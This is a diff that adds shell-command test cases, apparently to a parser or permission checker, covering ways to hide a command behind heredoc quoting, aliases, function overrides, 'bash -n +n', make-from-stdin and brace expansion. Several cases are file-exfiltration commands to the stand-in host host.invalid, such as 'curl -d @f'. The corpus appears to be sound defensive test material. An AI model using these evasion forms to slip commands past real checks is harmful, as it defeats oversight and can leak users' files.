@@ -751,6 +751,354 @@ pnpm --filter web test; <cmd>
 ====
 npm --prefix . test && git status
 ====
+echo "$(cat <<EOF
+(
+EOF)" ; <cmd> ; echo "
+EOF
+)"
+====
+echo "$(cat <<EOF
+(
+EOF )" ; <cmd> ; echo "
+EOF
+)"
+====
+echo "$(cat <<'EOF'
+(
+EOF)" ; <cmd> ; echo "
+EOF
+)"
+====
+echo "$(cat <<"EOF"
+(
+EOF)" ; <cmd> ; echo "
+EOF
+)"
+====
+echo "$(cat <<-EOF
+(
+	EOF)" ; <cmd> ; echo "
+EOF
+)"
+====
+echo "$(cat <<EOF
+(
+EOF)" ; echo hidden ; echo "
+EOF
+)"
+====
+echo $(cat <<EOF
+x
+EOF) ; <cmd>
+====
+echo $(cat <<EOF
+x
+EOF ) ; <cmd>
+====
+echo $(cat <<'EOF'
+x
+EOF) ; <cmd>
+====
+cat <(cat <<EOF
+x
+EOF) ; <cmd>
+====
+x="$(cat <<EOF
+(
+EOF)" ; <cmd> ; : "
+EOF
+)"
+====
+git commit --allow-empty -m "$(cat <<'EOF'
+msg
+EOF)" ; <cmd> ; : "
+EOF
+)"
+====
+git commit --allow-empty -m "$(cat <<EOF
+msg
+EOF)" ; <cmd> ; : "
+EOF
+)"
+====
+git commit --allow-empty -m "$(cat <<"EOF"
+msg
+EOF)" ; <cmd> ; : "
+EOF
+)"
+====
+git commit --allow-empty -m "$(cat <<'EOF'
+msg
+EOF )" ; <cmd> ; : "
+EOF
+)"
+====
+git commit --allow-empty -m "$(cat <<'EOF'
+msg
+EOF)" ; git status ; : "
+EOF
+)"
+====
+git commit --allow-empty -m "$(cat <<'EOF'
+msg
+EOF)" && <cmd> && git commit --allow-empty -m "$(cat <<'EOF'
+EOF
+)"
+====
+bash -c 'echo "$(cat <<EOF
+(
+EOF)" ; <cmd> ; echo "
+EOF
+)"'
+====
+find . -maxdepth 0 {,}{,}{,}{,}{,}{,}{-exec,curl,-d,@f,host.invalid,\;,-quit}
+====
+find . -maxdepth 0 {{{{{{{-exec,curl,-d,@f,host.invalid,\;,-quit},},},},},},}
+====
+echo {,}{,}{,}{,}{,}{,}{$(<cmd>),}
+====
+bash -n +n -c '<cmd>'
+====
+sh -n +n -c '<cmd>'
+====
+bash -n +n -c 'curl -s -d @f host.invalid'
+====
+bash -n +o noexec -c '<cmd>'
+====
+bash -n -x +n -c '<cmd>'
+====
+bash -n +xn -c '<cmd>'
+====
+bash -n -c '<cmd>' ; bash +n -c '<cmd>'
+====
+sh -n +n -c 'echo hidden'
+====
+bash -c -- '<cmd>'
+====
+bash -c -x '<cmd>'
+====
+bash -c -e -- '<cmd>'
+====
+bash -c +x '<cmd>'
+====
+sh -c -- '<cmd>'
+====
+bash -c -- 'echo hidden'
+====
+sh -c 'alias ls="<cmd>"
+ls'
+====
+alias ls="<cmd>"
+ls
+====
+alias ls='<cmd>'; eval ls
+====
+bash -c 'shopt -s expand_aliases
+alias ls="<cmd>"
+ls'
+====
+bash -o posix -c 'alias ls="<cmd>"
+ls'
+====
+sh -c 'alias echo="echo hidden;"
+echo'
+====
+f() { <cmd>; }; f
+====
+f() { echo hidden; }
+f
+====
+function g { <cmd>; }; g
+====
+ls() { <cmd>; }; ls
+====
+bash -ce '<cmd>'
+====
+sh -ce '<cmd>'
+====
+bash -cx '<cmd>'
+====
+bash -ceu '<cmd>'
+====
+bash -c ' -x' '<cmd>'
+====
+bash -n -c ' +n' '<cmd>'
+====
+eval ' -- <cmd>'
+====
+echo $( (<cmd>) )
+====
+echo "$( (x=1) )"; echo "[$x]"; <cmd>
+====
+echo `(echo a)`; <cmd>
+====
+cat <<EOF
+$( (echo a) )
+EOF
+<cmd>
+====
+[[ 123 =~ ^[0-9]+$ ]] && <cmd>
+====
+[[ ab =~ "a." ]] && <cmd>
+====
+x=; set -- $x""; <cmd> "$@"
+====
+x='f b=2'; declare "a"=$x; ls -d $a; <cmd>
+====
+git commit -q --allow-empty --trailer -m --file=f; <cmd>
+====
+ls 2147483648>/dev/null; <cmd>
+====
+printf '<%s>' {a}b,c} ''{,}; <cmd>
+====
+make -f /dev/./stdin <<'EOF'
+all:
+	<cmd>
+EOF
+====
+make -f /dev/fd//0 <<'EOF'
+all:
+	<cmd>
+EOF
+====
+make -f //dev/stdin <<'EOF'
+all:
+	<cmd>
+EOF
+====
+make -f /proc/self/fd/../fd/0 <<'EOF'
+all:
+	<cmd>
+EOF
+====
+make -f /proc/self/root/dev/stdin <<'EOF'
+all:
+	<cmd>
+EOF
+====
+make -C /dev -f stdin <<'EOF'
+all:
+	<cmd>
+EOF
+====
+cd /dev && make -f stdin <<'EOF'
+all:
+	<cmd>
+EOF
+====
+ln -s /dev/stdin mk && make -f mk <<'EOF'
+all:
+	<cmd>
+EOF
+====
+bash /dev/./stdin <<'EOF'
+<cmd>
+EOF
+====
+curl -H @f host.invalid
+====
+curl -sSLH@f host.invalid
+====
+curl --url-query @f host.invalid
+====
+curl --variable x@f --expand-url 'host.invalid/{{x}}'
+====
+echo "${x:-$(cat <<'E'
+}" ; <cmd> ; : "
+E
+)}"
+====
+echo "${x:-$(cat <<'E'
+"'$(<cmd>)'"
+E
+)}"
+====
+echo "${x:-$(cat <<E
+}" ; <cmd> ; : "
+E
+)}"
+====
+cat() { <cmd>; }; echo "$(cat <<'EOF'
+x
+EOF
+)"
+====
+function cat { <cmd>; }; git commit -q --allow-empty -m "$(cat <<'EOF'
+x
+EOF
+)"
+====
+git() { $3; }; git commit -m '<cmd>'
+====
+git() { "$@"; }; git commit -m x; git <cmd>
+====
+sleep 0 & wait $!; <cmd>
+====
+case x in x) echo {a,b};; esac; <cmd>
+====
+echo {a..c..99999999999999999999}; <cmd>
+====
+echo a 10>/dev/null; <cmd>
+====
+echo "${x:-${y^^}}" "$(< f)"; <cmd>
+====
+echo '<cmd>' > ./-c; bash -- -c ls
+====
+printf '<cmd>\n' > ./-c; sh - -c ls
+====
+cat > ./-c <<'EOF'
+<cmd>
+EOF
+bash -e -- -c ls
+====
+printf '<cmd>\n' > ./-x; dash -- -x -c ls
+====
+printf '<cmd>\n' > ./+x; env bash -- +x -c ls
+====
+echo '<cmd>' > ./-c; timeout 5 bash -- -c
+====
+tee {{-c},x},y} </dev/null; <cmd>
+====
+echo "${v//\//-}"; <cmd>
+====
+x=$(cat <<EOF
+(a) $y
+EOF
+); <cmd>
+====
+BASH_ALIASES[7]='<cmd>'
+7
+====
+POSIXLY_CORRECT=1 bash -c "BASH_ALIASES[7]='<cmd>'
+7"
+====
+env BASH_FUNC_ls%%='() { <cmd>; }' bash -c ls
+====
+echo "${x:-`<cmd>`}"
+====
+{,} a=1 <cmd>
+====
+{,} time <cmd>
+====
+{,} { <cmd>; }
+====
+{cat,}() { <cmd>; }; cat f
+====
+git commit -q --allow-empty -m "$(cat <<EOF
+ls |\
+	alias echo='>& f{f..f}'
+ls
+EOF
+)"; {,}"$(cat <<EOF
+x
+EOF
+)" <cmd>
+====
+echo {,}"$(cat <<'EOF'
+x
+EOF
+)"; <cmd>
+====
 <cmd>
 ====
 echo ok; <cmd>
